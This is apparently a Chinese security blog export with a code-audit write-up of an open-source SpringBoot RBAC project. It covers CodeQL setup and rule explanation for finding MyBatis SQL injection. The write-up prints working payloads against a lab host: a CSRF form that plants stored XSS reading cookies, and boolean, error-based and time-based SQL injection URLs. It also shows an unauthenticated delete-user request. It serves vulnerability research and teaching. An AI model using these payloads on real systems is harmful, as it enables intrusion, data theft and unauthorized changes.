<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://172.16.42.151/writep&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;notepaperId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ddf&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;concent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在我们达到了只要诱骗受害者点击链接就可以插入存储xss payload，而不需要自己登录去插入payload</p>
<p><img src="../images/pics/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/26.jpg"></p>
<p>除了这种方式，如果存在xss，我们可以通过xss绕过csrf漏洞防护，因为csrf防护一般都是refere或者token，存在xss就可以使用js脚本来调用修改refere或者token，从而进行csrf攻击。</p>
]]></content>
      <categories>
        <category>代码安全</category>
      </categories>
      <tags>
        <tag>代码安全</tag>
        <tag>代码审计</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>某RBAC系统代码审计</title>
    <url>/%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>一个SpringBoot+SpringSecurity+Mybatis+Mysql+Druid+Swagger的<a href="https://github.com/witmy/my-springsecurity-plus">项目</a>，使用手工加CodeQL进行0day挖掘</p>
<span id="more"></span>

<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><h3 id="1-1-配置maven镜像源"><a href="#1-1-配置maven镜像源" class="headerlink" title="1.1 配置maven镜像源"></a>1.1 配置maven镜像源</h3><p><code>&lt;/mirrors&gt;</code>标签下配置如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">   <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将其复制到idea默认目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS lib]$ cp /Library/Java/JavaVirtualMachines/apache-maven-3.8.2/conf/settings.xml ~/.m2/</span><br></pre></td></tr></table></figure>



<h3 id="1-2-配置数据库"><a href="#1-2-配置数据库" class="headerlink" title="1.2 配置数据库"></a>1.2 配置数据库</h3><p>mysql docker容器创建</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd --name my-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.15</span><br><span class="line"></span><br><span class="line">docker exec -it my-mysql bash</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">开启远程访问</span></span><br><span class="line">use mysql;</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;123456&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>解决mysql乱码问题</p>
<p>给/etc/mysql/my.cnf添加如下类容</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8mb4</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">character-set-server</span> = utf8mb4</span><br><span class="line"><span class="attr">collation-server</span> = utf8mb4_unicode_ci</span><br><span class="line"><span class="attr">init_connect</span>=<span class="string">&#x27;SET NAMES utf8mb4&#x27;</span></span><br><span class="line"><span class="attr">skip-character-set-client-handshake</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[client]</span></span><br><span class="line"><span class="attr">default-character-set</span> = utf8mb4</span><br></pre></td></tr></table></figure>

<p>结合原内容，如下</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[mysql]</span><br><span class="line"><span class="keyword">default</span>-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">pid-<span class="keyword">file</span>        = <span class="regexp">/var/</span>run<span class="regexp">/mysqld/my</span>sqld.pid</span><br><span class="line">socket          = <span class="regexp">/var/</span>run<span class="regexp">/mysqld/my</span>sqld.sock</span><br><span class="line">datadir         = <span class="regexp">/var/</span>lib/mysql</span><br><span class="line">secure-<span class="keyword">file</span>-priv= <span class="keyword">NULL</span></span><br><span class="line"># Disabling symbolic-links is recommended to prevent assorted security risks</span><br><span class="line">symbolic-links=<span class="number">0</span></span><br><span class="line">character-set-server = utf8mb4</span><br><span class="line">collation-server = utf8mb4_unicode_ci</span><br><span class="line">init_connect=<span class="string">&#x27;SET NAMES utf8mb4&#x27;</span></span><br><span class="line">skip-character-set-client-handshake = <span class="keyword">true</span></span><br><span class="line"></span><br><span class="line"># Custom config should go here</span><br><span class="line">!includedir <span class="regexp">/etc/my</span>sql<span class="regexp">/conf.d/</span></span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line"><span class="keyword">default</span>-character-set = utf8mb4</span><br></pre></td></tr></table></figure>

<p>将其复制到容器</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]# docker cp <span class="regexp">/etc/my</span>sql<span class="regexp">/my.cnf my-mysql:/</span>etc<span class="regexp">/mysql/</span></span><br></pre></td></tr></table></figure>

<p>重启容器</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker restart <span class="keyword">my</span>-mysql</span><br></pre></td></tr></table></figure>



<p>将项目的sql文件导入mysql 容器</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">docker cp ./quartz.sql my-mysql:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>进入容器里的mysql</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建数据库</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database rbac;</span></span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">进入rbac数据库</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use rbac;</span></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">加载mysql脚本</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">source</span> /root/rbac.sql</span></span><br></pre></td></tr></table></figure>



<h3 id="1-3-修改数据库连接配置文件"><a href="#1-3-修改数据库连接配置文件" class="headerlink" title="1.3 修改数据库连接配置文件"></a>1.3 修改数据库连接配置文件</h3><p>打开application.yml，修改mysql密码</p>
<h3 id="1-4-安装Free-MyBatis-Tool"><a href="#1-4-安装Free-MyBatis-Tool" class="headerlink" title="1.4 安装Free MyBatis Tool"></a>1.4 安装Free MyBatis Tool</h3><p>在idea插件市场安装，此插件可以从mybatis的xml文件跳转到对应的类。</p>
<h3 id="1-5-配置远程部署"><a href="#1-5-配置远程部署" class="headerlink" title="1.5 配置远程部署"></a>1.5 配置远程部署</h3><img src="../images/pics/代码审计/11.jpg"  /> 

<img src="../images/pics/代码审计/12.jpg"  /> 



<h3 id="1-6-运行"><a href="#1-6-运行" class="headerlink" title="1.6 运行"></a>1.6 运行</h3><p>配置好后就可以直接在远程的linux机器上运行了</p>
<h2 id="2-使用CodeQL分析"><a href="#2-使用CodeQL分析" class="headerlink" title="2. 使用CodeQL分析"></a>2. 使用CodeQL分析</h2><p>使用命令生成codeql database</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">codeql database create rbac-qldb -l java <span class="params">--command=</span><span class="string">&quot;mvn clean install -Dmaven.test.skip=true &quot;</span> <span class="params">--overwrite</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>路径不要带中文</p>
</blockquote>
<p>找不到com.sun tools.jar 和jconsole.jar给pom配置如下(codeql需要绝对路径)</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;dependency&gt;</span></span><br><span class="line">    <span class="params">&lt;groupId&gt;</span>com.sun<span class="params">&lt;/groupId&gt;</span></span><br><span class="line">    <span class="params">&lt;artifactId&gt;</span>tools<span class="params">&lt;/artifactId&gt;</span></span><br><span class="line">    <span class="params">&lt;version&gt;</span><span class="number">1.8</span><span class="params">&lt;/version&gt;</span></span><br><span class="line">    <span class="params">&lt;scope&gt;</span>system<span class="params">&lt;/scope&gt;</span></span><br><span class="line">    <span class="params">&lt;systemPath&gt;</span>绝对路径<span class="meta-keyword">/lib/</span>tools.jar<span class="params">&lt;/systemPath&gt;</span></span><br><span class="line"><span class="params">&lt;/dependency&gt;</span></span><br><span class="line"><span class="params">&lt;dependency&gt;</span></span><br><span class="line">    <span class="params">&lt;groupId&gt;</span>com.sun<span class="params">&lt;/groupId&gt;</span></span><br><span class="line">    <span class="params">&lt;artifactId&gt;</span>jconsole<span class="params">&lt;/artifactId&gt;</span></span><br><span class="line">    <span class="params">&lt;version&gt;</span><span class="number">1.8</span><span class="params">&lt;/version&gt;</span></span><br><span class="line">    <span class="params">&lt;scope&gt;</span>system<span class="params">&lt;/scope&gt;</span></span><br><span class="line">    <span class="params">&lt;systemPath&gt;</span>绝对路径<span class="meta-keyword">/lib/</span>jconsole.jar<span class="params">&lt;/systemPath&gt;</span></span><br><span class="line"><span class="params">&lt;/dependency&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用安全相关脚本进行扫描</p>
<h2 id="3-第三方依赖检查"><a href="#3-第三方依赖检查" class="headerlink" title="3. 第三方依赖检查"></a>3. 第三方依赖检查</h2><p>第三方依赖包漏洞检查攻击可使用<code>dependency-check</code>。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官方地址：</span><br><span class="line">https:<span class="regexp">//</span>owasp.org<span class="regexp">/www-project-dependency-check/</span></span><br><span class="line">Github地址：</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/jeremylong/</span>DependencyCheck</span><br></pre></td></tr></table></figure>

<p>我们手动查看pom.xml发现使用<code>Fastjson 1.2.56</code>版本，该版本存在漏洞，但这时候并不能确定存在漏洞，可能尽管使用了带有漏洞版本的组件，但并没有使用存在漏洞的相关函数。</p>
<h2 id="4-配置检查"><a href="#4-配置检查" class="headerlink" title="4. 配置检查"></a>4. 配置检查</h2><p>Spring boot中配置文件都在<code>src/main/resources</code>下面，名字通常为<code>application.yml</code>或者<code>application.properties</code>。配置文件中可能会存在数据库或其他组件的连接信息。</p>
<h2 id="5-SQL-注入挖掘"><a href="#5-SQL-注入挖掘" class="headerlink" title="5. SQL 注入挖掘"></a>5. SQL 注入挖掘</h2><h3 id="5-1-java中sql注入原理"><a href="#5-1-java中sql注入原理" class="headerlink" title="5.1 java中sql注入原理"></a>5.1 java中sql注入原理</h3><p>Mybatis的sql语句都是放在resources下的xx.xml文件中，一般文件名和文件夹名都是mapper什么的，表示配置文件通过反射映射到JDBC中执行。</p>
<p>Mybatis拼接sql有下面两种方式：</p>
<ul>
<li><p><code>#&#123;&#125;</code></p>
<p>MyBatis 创建一个预编译语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个“?”来标识，并被传递到一个新的预处理语句中，</p>
</li>
<li><p><code>$&#123;&#125;</code> </p>
<p>只是 string 替换，在动态 SQL 解析阶段将会进行变量替换，直接替换字符串，会导致SQL注入产生。</p>
</li>
</ul>
<p>开发的原则是能使用<code>#&#123;&#125;</code>的地方，一定使用<code>#&#123;&#125;</code>。但是SQL语句中存在无法使用<code>#&#123;&#125;</code>的场景，因为使用<code>#&#123;&#125;</code>会在原本的字段加上引号<code>&#39;&#39;</code>，导致SQL语句报错。不能使用<code>#&#123;&#125;</code>的场景我们需要特别注意，此处极易产生SQL注入。</p>
<p>一些不能使用<code>#&#123;&#125;</code>的场景：</p>
<ul>
<li>表名/字段名</li>
<li>order by/group by</li>
<li>like模糊查询</li>
<li>in</li>
</ul>
<p>表名一般不会通过用户传入，即使是用户传入，由于Mybatis的查询机制，并不会产生SQL注入。</p>
<h3 id="5-2-手动挖掘"><a href="#5-2-手动挖掘" class="headerlink" title="5.2 手动挖掘"></a>5.2 手动挖掘</h3><p>通过原理我们直接在文本搜索<code>$&#123;</code>并且范围限定在xml文件</p>
<ul>
<li>项目根目录右键搜索，也可以快捷键</li>
</ul>
<img src="../images/pics/代码审计/14.jpg"  /> 

<p>搜索<code>$&#123;</code>设定文本为.xml</p>
<img src="../images/pics/代码审计/13.jpg"  /> 

<p>我们可以看见已经搜到好几处存在<code>$&#123;</code>拼接的语句。进入这条语句所在的xml文件，通过之前安装的mybatis插件可以直接跳转到对应的类。</p>
<img src="../images/pics/代码审计/16.jpg" style="zoom:50%;" /> 

<p>通过追踪调用关系确定在api/user接口存在sql注入。通过布尔盲注判断</p>
<p><code>http://172.16.42.151:8088/api/user?page=1&amp;limit=10&amp;nickName=11+AND+2755=2755</code></p>
<p><code>http://172.16.42.151:8088/api/user?page=1&amp;limit=10&amp;nickName=11+AND+2755=2756</code></p>
<h3 id="5-4-使用CodeQL挖掘SQL注入"><a href="#5-4-使用CodeQL挖掘SQL注入" class="headerlink" title="5.4 使用CodeQL挖掘SQL注入"></a>5.4 使用CodeQL挖掘SQL注入</h3><p>使用CodeQL Java里的规则experimental/Security/CWE/，CWE-089是专门针对MyBatis配置文件的污点分析</p>
<p>扫描结果如下</p>
<img src="../images/pics/代码审计/17.jpg"  /> 

<p>此规则扫描出了14条不安全的sql污点传播路径。</p>
<p>以第一个为例分析一下看是否存在SQL注入，</p>
<ul>
<li>source点</li>
</ul>
<img src="../images/pics/代码审计/18.jpg"  /> 

<p>xml中的sql查询代码</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getFuzzyDept&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.entity.MyDept&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectDeptVo&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;deptName != null and deptName != &#x27;&#x27;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            AND d.dept_name like CONCAT(&#x27;%&#x27;, #</span><span class="template-variable">&#123;deptName&#125;</span><span class="xml">, &#x27;%&#x27;)</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            AND d.status = #</span><span class="template-variable">&#123;status&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;params.dataScope&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">    order by d.sort</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>显然是<code>$&#123;params.dataScope&#125;</code>参数进行了不安全的拼接，我们根据api构造poc</p>
<p><code>http://172.16.42.151:8088/api/user?page=1&amp;limit=10&amp;params[dataScope]=1</code></p>
<p><strong>尝试报错注入</strong></p>
<p>对<code>[]</code>进行url编码</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.16.42.151:8088</span>/api/user?page=<span class="number">1</span>&amp;limit=<span class="number">10</span>&amp;params%<span class="number">5</span>BdataScope%<span class="number">5</span>D=and+extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select+database()),<span class="number">0</span>x<span class="number">7</span>e))</span><br></pre></td></tr></table></figure>

<img src="../images/pics/代码审计/20.jpg"  />

<p>这里其实已经注入成功了，只是做了错误处理，不返回结果，在控制台可以发现已经返回来数据库。</p>
<img src="../images/pics/代码审计/21.jpg" style="zoom:50%;" />

<p>那只能盲注了</p>
<p><strong>盲注</strong></p>
<p>尝试时间盲注成功，但是睡眠时间有点久</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.16.42.151:8088</span>/api/user?page=<span class="number">1</span>&amp;limit=<span class="number">10</span>&amp;params%<span class="number">5</span>BdataScope%<span class="number">5</span>D=and+sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>也可以尝试布尔盲注和时间盲注都可以。</p>
<h3 id="5-5-CodeQL代码解读"><a href="#5-5-CodeQL代码解读" class="headerlink" title="5.5 CodeQL代码解读"></a>5.5 CodeQL代码解读</h3><p>MyBatisMapperXmlSqlInjection.ql的代码如下</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name SQL injection in MyBatis Mapper XML</span></span><br><span class="line"><span class="comment"> * @description Constructing a dynamic SQL statement with input that comes from an</span></span><br><span class="line"><span class="comment"> *              untrusted source could allow an attacker to modify the statement&#x27;s</span></span><br><span class="line"><span class="comment"> *              meaning or to execute arbitrary SQL commands.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity error</span></span><br><span class="line"><span class="comment"> * @precision high</span></span><br><span class="line"><span class="comment"> * @id java/mybatis-xml-sql-injection</span></span><br><span class="line"><span class="comment"> * @tags security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">import MyBatisCommonLib</span><br><span class="line">import MyBatisMapperXmlSqlInjectionLib</span><br><span class="line">import semmle.code.xml.MyBatisMapperXML</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> MyBatisMapperXmlSqlInjectionConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  <span class="constructor">MyBatisMapperXmlSqlInjectionConfiguration()</span> &#123; this = <span class="string">&quot;MyBatis mapper xml sql injection&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  override predicate is<span class="constructor">Source(DataFlow::Node <span class="params">source</span>)</span> &#123; source instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate is<span class="constructor">Sink(DataFlow::Node <span class="params">sink</span>)</span> &#123;</span><br><span class="line">    sink instanceof MyBatisMapperMethodCallAnArgument</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate is<span class="constructor">Sanitizer(DataFlow::Node <span class="params">node</span>)</span> &#123;</span><br><span class="line">    node.get<span class="constructor">Type()</span> instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line">    node.get<span class="constructor">Type()</span> instanceof BoxedType <span class="keyword">or</span></span><br><span class="line">    node.get<span class="constructor">Type()</span> instanceof NumberType</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate is<span class="constructor">AdditionalTaintStep(DataFlow::Node <span class="params">node1</span>, DataFlow::Node <span class="params">node2</span>)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma <span class="pattern-match">|</span></span><br><span class="line"><span class="pattern-match">      ma.get<span class="constructor">Method()</span>.get<span class="constructor">DeclaringType()</span> instanceof <span class="constructor">TypeObject</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">      ma.get<span class="constructor">Method()</span>.get<span class="constructor">Name()</span> = &quot;<span class="keyword">to</span><span class="constructor">String</span>&quot; <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">      ma.get<span class="constructor">Qualifier()</span> = node1.<span class="keyword">as</span><span class="constructor">Expr()</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">      ma = node2.<span class="keyword">as</span><span class="constructor">Expr()</span></span></span><br><span class="line"><span class="pattern-match">    )</span></span><br><span class="line"><span class="pattern-match">  &#125;</span></span><br><span class="line"><span class="pattern-match">&#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">from</span></span><br><span class="line"><span class="pattern-match">  <span class="constructor">MyBatisMapperXmlSqlInjectionConfiguration</span> cfg, <span class="constructor">DataFlow</span>::<span class="constructor">PathNode</span> source, <span class="constructor">DataFlow</span>::<span class="constructor">PathNode</span> sink,</span></span><br><span class="line"><span class="pattern-match">  <span class="constructor">MyBatisMapperXMLElement</span> mmxe, <span class="constructor">MethodAccess</span> ma, <span class="built_in">string</span> unsafe<span class="constructor">Expression</span></span></span><br><span class="line"><span class="pattern-match">where</span></span><br><span class="line"><span class="pattern-match">  cfg.has<span class="constructor">FlowPath(<span class="params">source</span>, <span class="params">sink</span>)</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">  ma.get<span class="constructor">AnArgument()</span> = sink.get<span class="constructor">Node()</span>.<span class="keyword">as</span><span class="constructor">Expr()</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">  my<span class="constructor">BatisMapperXMLElementFromMethod(<span class="params">ma</span>.<span class="params">getMethod</span>()</span>, mmxe) <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">  unsafe<span class="constructor">Expression</span> = get<span class="constructor">AMybatisXmlSetValue(<span class="params">mmxe</span>)</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">  (</span></span><br><span class="line"><span class="pattern-match">    is<span class="constructor">MybatisXmlOrAnnotationSqlInjection(<span class="params">sink</span>.<span class="params">getNode</span>()</span>, ma, unsafe<span class="constructor">Expression</span>)</span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">or</span></span></span><br><span class="line"><span class="pattern-match">    mmxe instanceof <span class="constructor">MyBatisMapperForeach</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">    is<span class="constructor">MybatisCollectionTypeSqlInjection(<span class="params">sink</span>.<span class="params">getNode</span>()</span>, ma, unsafe<span class="constructor">Expression</span>)</span></span><br><span class="line"><span class="pattern-match">  )</span></span><br><span class="line"><span class="pattern-match">select sink.get<span class="constructor">Node()</span>, source, sink,</span></span><br><span class="line"><span class="pattern-match">  &quot;<span class="constructor">MyBatis</span> <span class="constructor">Mapper</span> <span class="constructor">XML</span> <span class="constructor">SQL</span> injection might <span class="keyword">include</span> code from <span class="constructor">$</span>@ <span class="keyword">to</span> <span class="constructor">$</span>@.&quot;, source.get<span class="constructor">Node()</span>,</span></span><br><span class="line"><span class="pattern-match">  &quot;this user input&quot;, mmxe, &quot;this <span class="constructor">SQL</span> operation&quot;</span></span><br><span class="line"><span class="pattern-match"></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>@name</code></strong></p>
<p>简单说明该查询代码，里面可以使用单引号</p>
</li>
<li><p><strong><code>@description</code></strong></p>
<p>用来描述代码，做个稍微详细的说明</p>
</li>
<li><p><strong><code>@kind</code></strong></p>
<p>说明是告警查询还是路径查询，<code>@kind path-problem</code>表示是路径查询</p>
</li>
<li><p><strong><code>@problem.severity</code></strong></p>
<p>表示非安全的严重程度，这里<code>error</code>是最高等级，其次是<code>warning</code>，再其次是<code>recommendation</code></p>
</li>
<li><p><strong><code>@precision</code></strong></p>
<p>表示结果的准确性，<code>high</code>表示较高可可信度，总共有四个等级<code>very-high</code>、<code>high</code>、<code>medium</code>、<code>low</code></p>
</li>
<li><p><strong><code>@id</code></strong></p>
<p>表示这个查询的唯一id，一般格式<code>语言/简短描述</code></p>
</li>
<li><p><strong><code>@tags</code></strong></p>
<p>标签</p>
</li>
<li><p><strong><code>import java</code></strong></p>
<p>导入java的标准库</p>
</li>
<li><p><strong><code>import DataFlow::PathGraph</code></strong></p>
<p>路径图模块的标准库</p>
</li>
<li><p><strong><code>import MyBatisCommonLib</code></strong></p>
<p>导入同目录的MyBatisCommonLib.qll</p>
</li>
<li><p><strong><code>import MyBatisMapperXmlSqlInjectionLib</code></strong></p>
<p>导入同目录的MyBatisMapperXmlSqlInjectionLib.qll</p>
</li>
<li><p><strong><code>import semmle.code.xml.MyBatisMapperXML</code></strong></p>
<p>导入官方的MyBatisMapperXML库</p>
</li>
<li><p><strong><code>import semmle.code.java.dataflow.FlowSources</code></strong></p>
<p>该库里面有RemoteFlowSource类可以用来发现可能被用户控制的数据</p>
</li>
<li><p><strong><code>MyBatisMapperXmlSqlInjectionConfiguration</code>类</strong></p>
<p>声明一个私有的类，该类继承全局污点追踪<code>TaintTracking::Configuration</code>, </p>
<ul>
<li><p><code>MyBatisMapperXmlSqlInjectionConfiguration()</code>定义类的唯一名称。</p>
</li>
<li><p><code>isSource</code>定义source点是所有用户可控数据</p>
</li>
<li><p><code>isSink</code>中的<code>MyBatisMapperMethodCallAnArgument</code>是导入的库<code>MyBatisMapperXmlSqlInjectionLib</code>中的类，该类表示Mybatis xml文件中的sql语句了类，也就是执行了sql查询</p>
</li>
<li><p><code>isSanitizer</code>谓词是是对node的数据做了限制</p>
</li>
<li><p><code>isAdditionalTaintStep</code> 对节点见的数据流做了限制</p>
</li>
</ul>
</li>
<li><p><strong>from</strong>语句引入变量</p>
</li>
<li><p><strong>where</strong>语句里面定义条件，getAMybatisXmlSetValue谓词里定义了<code>$&#123;&#125;</code>编写Mybatis配置文件的问题。</p>
</li>
<li><p><strong>select</strong>语句，显示结果包括sink点、source点、sql语句所在的xml文件</p>
</li>
</ul>
<h2 id="6-越权"><a href="#6-越权" class="headerlink" title="6. 越权"></a>6. 越权</h2><p>Java中做角色控制的组件常见的有Apache shiro和Spring Security。它们将软件系统的安全认证相关的功能抽取出来，实现用户身份认证，权限授权、加密、会话管理等功能，组成了一个通用的安全认证框架。访问控制一般在filter/interceptor代码里，此项目未发现问题。</p>
<p>接下来看一下controller里的代码，在UserController的deleteUser方法我们可以发现为做权限检查，其他操作都有checkUserAllowed检查。结合渗透测试，找到删除功能，任意用户都可以通过如下接口删除</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>:<span class="number">8088</span><span class="regexp">/api/u</span>ser?userId=<span class="number">5</span></span><br></pre></td></tr></table></figure>





<h2 id="7-XSS"><a href="#7-XSS" class="headerlink" title="7. XSS"></a>7. XSS</h2><p>在项目中为发现针对xss的过滤器，猜测可能存在xss漏洞。通过分析resource里面的前端文件知道使用了Thymeleaf模板引擎和Layui框架。Thymeleaf中<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，<code>th:utext</code>不会将字符转义。也就是说使用了<code>th:utext</code>标签会出现XSS漏洞。此项目没有发现<code>th:utext</code>标签,</p>
